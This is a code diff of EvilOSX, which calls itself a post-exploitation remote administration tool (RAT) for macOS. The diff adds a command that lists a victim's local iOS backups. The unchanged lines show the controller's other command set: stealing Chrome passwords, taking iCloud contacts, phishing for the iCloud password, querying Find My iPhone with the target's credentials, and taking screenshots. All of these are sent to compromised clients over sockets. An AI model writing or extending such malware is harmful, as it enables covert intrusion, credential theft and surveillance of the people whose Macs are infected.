@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-# A pure python, post-exploitation, remote administration tool (RAT) for macOS / OS X.
+# EvilOSX: A pure python, post-exploitation, RAT (Remote Administration Tool) for macOS / OSX.
 import socket
 import ssl
 import thread
@@ -26,7 +26,8 @@ MESSAGE_INFO = "\033[94m" + "[I] " + "\033[0m"
 MESSAGE_ATTENTION = "\033[91m" + "[!] " + "\033[0m"
 
 commands = ["help", "status", "clients", "connect", "clear", "get_info", "get_root", "get_computer_name",
-            "get_shell_info", "chrome_passwords", "icloud_contacts", "icloud_phish", "find_my_iphone", "screenshot", "kill_client"]
+            "get_shell_info", "chrome_passwords", "icloud_contacts", "icloud_phish", "find_my_iphone",
+            "screenshot", "itunes_backups", "kill_client"]
 status_messages = []
 
 # The ID of the client is it's place in the array
@@ -44,6 +45,7 @@ def print_help():
     print "chrome_passwords  -  Retrieve Chrome passwords."
     print "icloud_contacts   -  Retrieve iCloud contacts."
     print "icloud_phish      -  Attempt to get iCloud password via phishing."
+    print "itunes_backups    -  Show the user's local iOS backups."
     print "find_my_iphone    -  Retrieve find my iphone devices."
     print "screenshot        -  Takes a screenshot of the client."
     print "kill_client       -  Brutally kill the client (removes the server)."
@@ -124,7 +126,7 @@ def send_command(connection, message):
 
 
 def start_server(port):
-    # Start the server
+    """Start the server"""
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -259,6 +261,8 @@ if __name__ == '__main__':
                                         print MESSAGE_INFO + "Stopping phishing attempt, waiting for phishing output..."
                                         print send_command(connections[current_client_id], "icloud_phish_stop")
                                         break
+                        elif command == "itunes_backups":
+                            print send_command(connections[current_client_id], "itunes_backups")
                         elif command == "find_my_iphone":
                             print MESSAGE_INFO + "The target's email and password is required to get devices."
                             email = raw_input(MESSAGE_INPUT + "Email: ")
